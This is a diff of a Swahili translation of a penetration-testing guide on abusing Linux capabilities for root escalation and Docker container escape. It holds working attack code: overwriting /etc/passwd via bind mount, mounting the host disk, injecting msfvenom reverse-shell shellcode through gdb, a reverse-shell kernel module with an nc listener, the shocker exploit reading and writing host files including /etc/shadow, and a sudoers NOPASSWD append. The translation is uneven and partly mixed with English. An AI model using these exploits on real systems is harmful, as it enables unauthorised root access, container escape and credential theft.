-Kwa kutumia python unaweza kufunga faili iliyobadilishwa ya _passwd_ juu ya faili halisi ya _passwd_:
+Kwa kutumia python unaweza kuunganisha faili iliyobadilishwa _passwd_ juu ya faili halisi _passwd_:
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-Na hatimaye **funga** faili iliyobadilishwa ya `passwd` kwenye `/etc/passwd`:
+Na hatimaye **mount** faili la `passwd` lililobadilishwa kwenye `/etc/passwd`:
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -434,11 +405,11 @@ options = b"rw"
 mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
-Na utaweza **`su` kama root** kwa kutumia nenosiri "password".
+Na utaweza **`su` kama root** ukitumia nenosiri "password".
 
 **Mfano na mazingira (Docker breakout)**
 
-Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya Docker kwa kutumia:
+Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -451,11 +422,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa SYS_ADMIN umewezeshwa.
+Ndani ya matokeo ya awali unaweza kuona kwamba uwezo wa SYS\_ADMIN umewezeshwa.
 
-* **Kuunganisha**
+* **Mount**
 
-Hii inaruhusu kontena ya docker kuunganisha diski ya mwenyeji na kuiwezesha kupata kwa uhuru:
+Hii inaruhusu kontena la docker **kuweka diski ya mwenyeji na kuipata kwa uhuru**:
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -469,8 +440,8 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 ```
 * **Upatikanaji kamili**
 
-Katika njia iliyotangulia tulifanikiwa kupata ufikiaji wa diski ya mwenyeji wa docker.\
-Ikiwa utagundua kuwa mwenyeji anaendesha seva ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski ya mwenyeji wa docker** na kufikia kupitia SSH:
+Katika njia iliyopita tulifanikiwa kupata diski ya mwenyeji wa docker.\
+Ikiwa utagundua kuwa mwenyeji anafanya kazi na seva ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski ya mwenyeji wa docker** na kuipata kupitia SSH:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -486,9 +457,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP\_SYS\_PTRACE
 
-**Hii inamaanisha kuwa unaweza kutoroka kwenye chombo kwa kuingiza shellcode ndani ya mchakato fulani unaoendesha ndani ya mwenyeji.** Ili kupata ufikiaji wa michakato inayoendesha ndani ya mwenyeji, chombo kinahitaji kuendeshwa angalau na **`--pid=host`**.
+**Hii inamaanisha kwamba unaweza kutoroka kwenye kontena kwa kuingiza shellcode ndani ya mchakato fulani unaoendesha ndani ya mwenyeji.** Ili kufikia michakato inayofanya kazi ndani ya mwenyeji, kontena linahitaji kuendeshwa angalau na **`--pid=host`**.
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inaruhusu uwezo wa kutumia utambuzi na ufuatiliaji wa kazi za mfumo zinazotolewa na `ptrace(2)` na wito wa kuambatisha kumbukumbu kama vile `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ni yenye nguvu kwa madhumuni ya uchunguzi na ufuatiliaji, ikiwa `CAP_SYS_PTRACE` inawezeshwa bila hatua za kizuizi kama vile kichujio cha seccomp kwenye `ptrace(2)`, inaweza kuhatarisha sana usalama wa mfumo. Hasa, inaweza kutumika kuzunguka vizuizi vingine vya usalama, haswa vile vilivyowekwa na seccomp, kama inavyodhihirishwa na [uthibitisho wa dhana (PoC) kama huu](https://gist.github.com/thejh/8346f47e359adecd1d53).
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inatoa uwezo wa kutumia kazi za ufuatiliaji na ufuatiliaji wa wito wa mfumo zinazotolewa na `ptrace(2)` na wito za kuunganisha msongamano wa kumbukumbu kama `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ni nguvu kwa ajili ya madhumuni ya uchunguzi na ufuatiliaji, ikiwa `CAP_SYS_PTRACE` imewezeshwa bila hatua za kikomo kama vile filta ya seccomp kwenye `ptrace(2)`, inaweza kudhoofisha usalama wa mfumo kwa kiasi kikubwa. Kwa haswa, inaweza kutumika kukwepa vizuizi vingine vya usalama, hasa vile vinavyowekwa na seccomp, kama inavyoonyeshwa na [uthibitisho wa dhana (PoC) kama hii](https://gist.github.com/thejh/8346f47e359adecd1d53).
 
 **Mfano na binary (python)**
 ```bash
@@ -582,32 +553,13 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 # Detach from the process.
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
-**Mfano na faili (gdb)**
+**Mfano na binary (gdb)**
 
 `gdb` na uwezo wa `ptrace`:
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-# Unda Shellcode na msfvenom kuingiza kwenye kumbukumbu kupitia gdb
-
-Ili kuunda shellcode na msfvenom na kuiingiza kwenye kumbukumbu kupitia gdb, unaweza kufuata hatua zifuatazo:
-
-1. Kwanza, tumia msfvenom kuunda payload ya shellcode. Chagua payload inayofaa kwa kusudi lako, kama vile `linux/x86/shell_reverse_tcp`. Chini ni mfano wa amri ya msfvenom:
-
-   ```
-   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP yako> LPORT=<Namba ya bandari> -f raw -o shellcode
-   ```
-
-   Badilisha `<IP yako>` na anwani ya IP ya mashine yako ya kusikiliza na `<Namba ya bandari>` na namba ya bandari unayotaka kutumia.
-
-2. Baada ya kutekeleza amri hiyo, msfvenom itaunda faili ya shellcode inayoitwa "shellcode".
-
-3. Sasa, fungua gdb na uanze kutekeleza programu ambayo unataka kuingiza shellcode ndani yake.
-
-4. Mara tu programu inapopakia kwenye gdb, tumia amri ifuatayo kuingiza shellcode kwenye kumbukumbu:
-
-   ```
-   set {unsigned char *}0x<Anwani ya kumbukumbu> = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+# Kuunda shellcode na msfvenom ili kuingiza kwenye kumbukumbu kupitia gdb
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -631,23 +583,7 @@ chunks += f"{byte:02x}"
 
 print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
-Chunguza kwa kina mchakato wa mizizi na gdb na nakili na ubandike mistari ya gdb iliyotengenezwa hapo awali:
-
-```bash
-$ gdb -p <pid>
-(gdb) set follow-fork-mode child
-(gdb) set detach-on-fork off
-(gdb) catch exec
-(gdb) run
-```
-
-```bash
-$ gdb -p <pid>
-(gdb) set follow-fork-mode child
-(gdb) set detach-on-fork off
-(gdb) catch exec
-(gdb) run
-```
+Debug a root process with gdb na nakala-bandika mistari ya gdb iliyotengenezwa awali:
 ```bash
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
@@ -670,7 +606,7 @@ process 207009 is executing new program: /usr/bin/dash
 ```
 **Mfano na mazingira (Docker breakout) - Matumizi mengine ya gdb**
 
-Ikiwa **GDB** imefungwa (au unaweza kuifunga kwa kutumia `apk add gdb` au `apt install gdb` kwa mfano), unaweza **kudebugi mchakato kutoka kwenye mwenyeji** na kumfanya aite kazi ya `system`. (Mbinu hii pia inahitaji uwezo wa `SYS_ADMIN`).
+Ikiwa **GDB** imewekwa (au unaweza kuisakinisha kwa `apk add gdb` au `apt install gdb` kwa mfano) unaweza **kuchunguza mchakato kutoka kwa mwenyeji** na kufanya uitwe kazi ya `system`. (Teknolojia hii pia inahitaji uwezo `SYS_ADMIN`)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
@@ -680,12 +616,12 @@ gdb -p 1234
 Hutaweza kuona matokeo ya amri iliyotekelezwa lakini itatekelezwa na mchakato huo (hivyo pata rev shell).
 
 {% hint style="warning" %}
-Ikiwa unapata kosa "Hakuna ishara "system" katika muktadha wa sasa." angalia mfano uliopita wa kupakia shellcode katika programu kupitia gdb.
+Ikiwa unapata kosa "No symbol "system" in current context." angalia mfano wa awali wa kupakia shellcode katika programu kupitia gdb.
 {% endhint %}
 
-**Mfano na mazingira (Docker breakout) - Uingizaji wa Shellcode**
+**Mfano na mazingira (Docker breakout) - Shellcode Injection**
 
-Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
+Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -698,18 +634,18 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-Orodhesha **mchakato** unaofanya kazi kwenye **mwenyeji** `ps -eaf`
+List **processes** running in the **host** `ps -eaf`
 
-1. Pata **usanifu** `uname -m`
-2. Tafuta **shellcode** kwa usanifu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. Tafuta **programu** ya **kuingiza** **shellcode** kwenye kumbukumbu ya mchakato ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
-4. **Badilisha** shellcode ndani ya programu na **itafsiri** `gcc inject.c -o inject`
-5. **Ingiza** na pata **shell** yako: `./inject 299; nc 172.17.0.1 5600`
+1. Get the **architecture** `uname -m`
+2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
+4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
+5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP\_SYS\_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inawezesha mchakato kufanya **upakiaji na uondolewaji wa moduli za kernel (`init_module(2)`, `finit_module(2)` na `delete_module(2)` wito wa mfumo)**, ikitoa ufikiaji moja kwa moja kwa shughuli za msingi za kernel. Uwezo huu unaweka hatari kubwa ya usalama, kwani inawezesha kuongeza mamlaka na kuhatarisha mfumo mzima kwa kuruhusu mabadiliko kwenye kernel, hivyo kukiuka taratibu zote za usalama za Linux, ikiwa ni pamoja na Moduli za Usalama za Linux na kizuizi cha kontena.
-**Hii inamaanisha kuwa unaweza** **kuweka/kuondoa moduli za kernel kwenye mashine ya mwenyeji.**
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inaruhusu mchakato **kuchoma na kuondoa moduli za kernel (`init_module(2)`, `finit_module(2)` na `delete_module(2)` system calls)**, ikitoa ufikiaji wa moja kwa moja kwa operesheni kuu za kernel. Uwezo huu una hatari kubwa za usalama, kwani unaruhusu kupanda vyeo na kuathiri mfumo mzima kwa kuruhusu mabadiliko kwenye kernel, hivyo kupita mitambo yote ya usalama ya Linux, ikiwa ni pamoja na Moduli za Usalama za Linux na kutengwa kwa kontena.  
+**Hii inamaanisha kwamba unaweza** **kuingiza/kuondoa moduli za kernel katika/katika kernel ya mashine mwenyeji.**
 
 **Mfano na binary**
 
@@ -718,35 +654,35 @@ Katika mfano ufuatao, binary **`python`** ina uwezo huu.
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-Kwa chaguo-msingi, amri ya **`modprobe`** inachunguza orodha ya utegemezi na faili za ramani katika saraka **`/lib/modules/$(uname -r)`**.\
-Ili kutumia hili vibaya, hebu tujenge saraka bandia ya **lib/modules**:
+Kwa default, amri ya **`modprobe`** inakagua orodha ya utegemezi na faili za ramani katika saraka **`/lib/modules/$(uname -r)`**.\
+Ili kutumia hii vibaya, hebu tuunde folda ya uwongo ya **lib/modules**:
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-Kisha **kamilisha moduli ya kernel unaweza kupata mifano 2 hapa chini na nakili** kwenye folda hii:
+Kisha **unda moduli ya kernel ambayo unaweza kupata mifano 2 hapa chini na nakala** yake kwenye folda hii:
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-Hatimaye, tekeleza msimbo wa python unaohitajika ili kupakia kifurushi hiki cha kernel:
+Hatimaye, tekeleza msimbo wa python unaohitajika kupakia moduli hii ya kernel:
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
-**Mfano 2 na binary**
+**Mfano wa 2 na binary**
 
-Katika mfano ufuatao binary **`kmod`** ina uwezo huu.
+Katika mfano ufuatao, binary **`kmod`** ina uwezo huu.
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-Hii inamaanisha kwamba ni rahisi kutumia amri **`insmod`** kuweka moduli ya kernel. Fuata mfano hapa chini ili kupata **shell ya nyuma** kwa kutumia mamlaka haya.
+Ambayo inamaanisha kwamba inawezekana kutumia amri **`insmod`** kuingiza moduli ya kernel. Fuata mfano hapa chini kupata **reverse shell** ukitumia haki hii.
 
 **Mfano na mazingira (Docker breakout)**
 
-Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
+Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -759,9 +695,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa **SYS\_MODULE** umewezeshwa.
+Ndani ya matokeo ya awali unaweza kuona kwamba uwezo wa **SYS\_MODULE** umewezeshwa.
 
-**Tengeneza** **moduli ya kernel** ambayo itatekeleza kitanzi cha kurudisha na **Makefile** ya **kuikusanya**:
+**Unda** **moduli ya kernel** ambayo itatekeleza shell ya nyuma na **Makefile** ili **kuunda** hiyo:
 
 {% code title="reverse-shell.c" %}
 ```c
@@ -787,6 +723,8 @@ printk(KERN_INFO "Exiting\n");
 module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
+{% endcode %}
+
 {% code title="Makefile" %}
 ```bash
 obj-m +=reverse-shell.o
@@ -800,17 +738,17 @@ make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 {% endcode %}
 
 {% hint style="warning" %}
-Neno tupu kabla ya kila neno la kufanya katika faili ya Kufanya **lazima iwe tab, sio nafasi**!
+Karakteri tupu kabla ya kila neno la make katika Makefile **lazima iwe tab, si nafasi**!
 {% endhint %}
 
-Tumia `fanya` ili kuikusanya.
+Execute `make` to compile it.
 ```
 ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.
 
 sudo apt update
 sudo apt full-upgrade
 ```
-Hatimaye, anza `nc` ndani ya kikao na **pakiwa moduli** kutoka kikao kingine na utapata kikao katika mchakato wa nc:
+Hatimaye, anzisha `nc` ndani ya shell na **pakia moduli** kutoka nyingine na utaweza kukamata shell katika mchakato wa nc:
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -818,18 +756,18 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing SYS\_MODULE Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**Msimbo wa mbinu hii ulikopwa kutoka maabara ya "Abusing SYS\_MODULE Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
 Mfano mwingine wa mbinu hii unaweza kupatikana katika [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inawezesha mchakato kukiuka ruhusa za kusoma faili na kusoma na kutekeleza saraka. Matumizi yake kuu ni kwa ajili ya utafutaji wa faili au kusoma. Walakini, pia inaruhusu mchakato kutumia kazi ya `open_by_handle_at(2)`, ambayo inaweza kupata faili yoyote, ikiwa ni pamoja na zile nje ya kipekee cha mchakato. Kipekee kinachotumiwa katika `open_by_handle_at(2)` kinapaswa kuwa kitambulisho kisichoweza kuonekana kupitia `name_to_handle_at(2)`, lakini inaweza kujumuisha habari nyeti kama nambari za inode ambazo zinaweza kudukuliwa. Uwezekano wa kutumia uwezo huu, haswa katika muktadha wa vyombo vya Docker, ulidhihirishwa na Sebastian Krahmer na shambulio la shocker, kama ilivyoainishwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
-**Hii inamaanisha kuwa unaweza kukiuka ukaguzi wa ruhusa za kusoma faili na ukaguzi wa ruhusa za kusoma/utekelezaji wa saraka.**
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inaruhusu mchakato **kuzidi ruhusa za kusoma faili na za kusoma na kutekeleza saraka**. Matumizi yake makuu ni kwa ajili ya kutafuta au kusoma faili. Hata hivyo, inaruhusu pia mchakato kutumia kazi ya `open_by_handle_at(2)`, ambayo inaweza kufikia faili yoyote, ikiwa ni pamoja na zile zilizo nje ya eneo la mchakato. Kifaa kinachotumika katika `open_by_handle_at(2)` kinapaswa kuwa kitambulisho kisichokuwa wazi kilichopatikana kupitia `name_to_handle_at(2)`, lakini kinaweza kujumuisha taarifa nyeti kama nambari za inode ambazo ziko hatarini kubadilishwa. Uwezekano wa kutumia uwezo huu, hasa katika muktadha wa kontena za Docker, ulionyeshwa na Sebastian Krahmer kwa kutumia exploit ya shocker, kama ilivyochambuliwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+**Hii inamaanisha kwamba unaweza** **kuzidi kuangalia ruhusa za kusoma faili na kuangalia ruhusa za kusoma/kutekeleza saraka.**
 
-**Mfano na faili ya binary**
+**Mfano na binary**
 
-Faili ya binary itaweza kusoma faili yoyote. Kwa hivyo, ikiwa faili kama tar ina uwezo huu, itaweza kusoma faili ya shadow:
+Binary itakuwa na uwezo wa kusoma faili yoyote. Hivyo, ikiwa faili kama tar ina uwezo huu itakuwa na uwezo wa kusoma faili la kivuli:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -838,7 +776,7 @@ tar -cxf shadow.tar.gz
 ```
 **Mfano na binary2**
 
-Katika kesi hii, fikiria kuwa kuna uwezo huu kwenye binary ya **`python`**. Ili kuorodhesha faili za mizizi, unaweza kufanya yafuatayo:
+Katika kesi hii, hebu tuone kwamba **`python`** binary ina uwezo huu. Ili orodhesha faili za root unaweza kufanya:
 ```python
 import os
 for r, d, f in os.walk('/root'):
@@ -851,7 +789,7 @@ print(open("/etc/shadow", "r").read())
 ```
 **Mfano katika Mazingira (Docker breakout)**
 
-Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
+You can check the enabled capabilities inside the docker container using:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -864,11 +802,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa **DAC\_READ\_SEARCH** umewezeshwa. Kama matokeo, chombo kinaweza **kuchunguza michakato**.
+Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.
 
-Unaweza kujifunza jinsi mbinu ifuatayo inavyofanya kazi katika [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) lakini kwa muhtasari **CAP\_DAC\_READ\_SEARCH** sio tu inaturuhusu kupitia mfumo wa faili bila ukaguzi wa idhini, lakini pia inaondoa wazi ukaguzi wowote kwa _**open\_by\_handle\_at(2)**_ na **inaweza kuruhusu michakato yetu kufikia faili nyeti zilizofunguliwa na michakato mingine**.
+You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** sio tu inatuwezesha kupita kwenye mfumo wa faili bila ukaguzi wa ruhusa, bali pia inafuta waziwazi ukaguzi wowote wa _**open\_by\_handle\_at(2)**_ na **inaweza kuruhusu mchakato wetu kufikia faili nyeti zilizo funguliwa na michakato mingine**.
 
-Mbinu ya awali ambayo inatumia uwezo huu kusoma faili kutoka kwenye mwenyeji inaweza kupatikana hapa: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ifuatayo ni **toleo lililobadilishwa ambalo linakuwezesha kuonyesha faili unayotaka kusoma kama hoja ya kwanza na kuiweka kwenye faili.**
+The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1019,47 +957,47 @@ return 0;
 }
 ```
 {% hint style="warning" %}
-Exploit hii inahitaji kupata pointer kwa kitu kilichomount kwenye mwenyeji. Exploit ya awali ilikuwa inatumia faili /.dockerinit na toleo lililobadilishwa linatumia /etc/hostname. Ikiwa exploit haifanyi kazi, labda unahitaji kuweka faili tofauti. Ili kupata faili ambayo imemount kwenye mwenyeji, tuendeshe amri ya mount:
+Exploiti inahitaji kupata kiashiria kwa kitu kilichowekwa kwenye mwenyeji. Exploiti ya awali ilitumia faili /.dockerinit na toleo hili lililobadilishwa linatumia /etc/hostname. Ikiwa exploiti haifanyi kazi labda unahitaji kuweka faili tofauti. Ili kupata faili ambayo imewekwa kwenye mwenyeji tekeleza amri ya mount:
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (407) (1).png>)
 
-**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing DAC\_READ\_SEARCH Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**Msimbo wa mbinu hii ulikopwa kutoka maabara ya "Abusing DAC\_READ\_SEARCH Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
 ​
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Spain** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_DAC\_OVERRIDE
 
-**Hii inamaanisha kuwa unaweza kuepuka ukaguzi wa ruhusa ya kuandika kwenye faili yoyote, hivyo unaweza kuandika faili yoyote.**
+**Hii inamaanisha kwamba unaweza kupita ukaguzi wa ruhusa za kuandika kwenye faili yoyote, hivyo unaweza kuandika faili yoyote.**
 
-Kuna faili nyingi unazoweza **kuandika upya ili kuongeza mamlaka,** [**unaweza kupata wazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Kuna faili nyingi ambazo unaweza **kuandika upya ili kupandisha mamlaka,** [**unaweza kupata mawazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Mfano na binary**
 
-Katika mfano huu, vim ina uwezo huu, hivyo unaweza kubadilisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:
+Katika mfano huu vim ina uwezo huu, hivyo unaweza kubadilisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
 
 vim /etc/sudoers #To overwrite it
 ```
-**Mfano na faili ya 2**
+**Mfano na binary 2**
 
-Katika mfano huu, faili ya **`python`** itakuwa na uwezo huu. Unaweza kutumia python kubadilisha faili yoyote:
+Katika mfano huu **`python`** binary itakuwa na uwezo huu. Unaweza kutumia python kubadilisha faili yoyote:
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**Mfano na mazingira + CAP_DAC_READ_SEARCH (Docker breakout)**
+**Mfano na mazingira + CAP\_DAC\_READ\_SEARCH (Docker breakout)**
 
-Unaweza kuangalia uwezo uliowezeshwa ndani ya chombo cha docker kwa kutumia:
+Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -1072,8 +1010,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Kwanza soma sehemu iliyotangulia ambayo [**inatumia uwezo wa DAC\_READ\_SEARCH kusoma faili za aina yoyote**](linux-capabilities.md#cap\_dac\_read\_search) ya mwenyeji na **kuchakata** shambulio.\
-Kisha, **chakata toleo lifuatalo la shambulio la shocker** ambalo litakuruhusu **kuandika faili za aina yoyote** ndani ya mfumo wa faili wa mwenyeji:
+Kwanza, soma sehemu ya awali ambayo [**inatumia uwezo wa DAC\_READ\_SEARCH kusoma faili za kawaida**](linux-capabilities.md#cap\_dac\_read\_search) za mwenyeji na **kusanyisha** exploit.\
+Kisha, **kusanyisha toleo linalofuata la exploit ya shocker** ambalo litakuruhusu **kuandika faili za kawaida** ndani ya mfumo wa faili wa wenyeji:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1212,17 +1150,17 @@ close(fd1);
 return 0;
 }
 ```
-Ili kutoroka kwenye kontena ya docker unaweza **kupakua** faili `/etc/shadow` na `/etc/passwd` kutoka kwenye mwenyeji, **kuongeza** mtumiaji **mpya**, na kutumia **`shocker_write`** kuwafuta. Kisha, **fikia** kupitia **ssh**.
+Ili kutoroka kwenye kontena la docker unaweza **kupakua** faili `/etc/shadow` na `/etc/passwd` kutoka kwa mwenyeji, **kuongeza** mtumiaji **mpya**, na kutumia **`shocker_write`** kuandika upya. Kisha, **fikia** kupitia **ssh**.
 
-**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing DAC\_OVERRIDE Capability" kutoka** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
